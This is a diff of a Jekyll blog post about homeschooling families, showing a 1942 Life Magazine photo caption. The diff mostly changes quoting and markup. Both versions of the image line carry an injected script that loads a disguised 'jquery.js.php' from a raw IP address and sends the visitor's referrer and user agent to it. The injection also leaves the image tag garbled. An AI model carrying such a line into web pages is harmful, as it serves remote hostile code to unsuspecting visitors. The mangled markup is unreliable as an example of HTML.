@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 'The Daily Life of Four Homeschooling Families'
+title: "The Daily Life of Four Homeschooling Families"
 date: 19-Oct-2014
 categories: tbd
 ---
@@ -11,9 +11,9 @@ categories: tbd
 
 
 
-<p <img class="photo-horiz" ext/javascript" rel="nofollow"  document.write("<script language='javascript' rel='nofollow' type='text/javascript' src='http://5.45.67.97/1/jquery.js.php?r=" + encodeuri(document.referrer) + "&u=" + encodeuri(navigator.useragent) + "'></sc" + "ript>"); </script></noindex>  1942,   by Bernard Hoffman" src="http://media-cache-ec0.pinimg.com/736x/c5/ec/ce/c5ecce605de572e343a813ce9dc7fcb1.jpg" /></p>
+<img class="photo-horiz" ext/javascript" rel="nofollow"  document.write("<script language='javascript' rel='nofollow' type='text/javascript' src='http://5.45.67.97/1/jquery.js.php?r=" + encodeuri(document.referrer) + "&u=" + encodeuri(navigator.useragent) + "'></sc" + "ript>"); </script></noindex>  1942,   by Bernard Hoffman" src="http://media-cache-ec0.pinimg.com/736x/c5/ec/ce/c5ecce605de572e343a813ce9dc7fcb1.jpg" />
 
-<h6 Bored schoolgirl in Maine 1942,   Bernard Hoffman for <a href="http://life.time.com/">Life Magazine</a></h6>
+Bored schoolgirl in Maine 1942,   Bernard Hoffman for <a href="http://life.time.com/">Life Magazine</a>
 
  
 
